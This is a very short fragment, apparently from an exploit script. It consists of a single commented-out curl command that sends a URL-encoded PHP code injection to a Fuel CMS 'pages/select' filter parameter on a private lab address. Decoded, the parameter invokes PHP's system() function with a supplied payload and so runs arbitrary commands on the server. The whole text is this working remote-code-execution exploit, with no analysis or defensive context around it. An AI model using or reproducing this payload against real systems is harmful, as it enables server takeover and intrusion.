...
#curl -s "http://10.10.143.66/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27${payload}%27%29%2b%27" | sed '/<div style="border:1px/q' | sed '1s/^system//g'
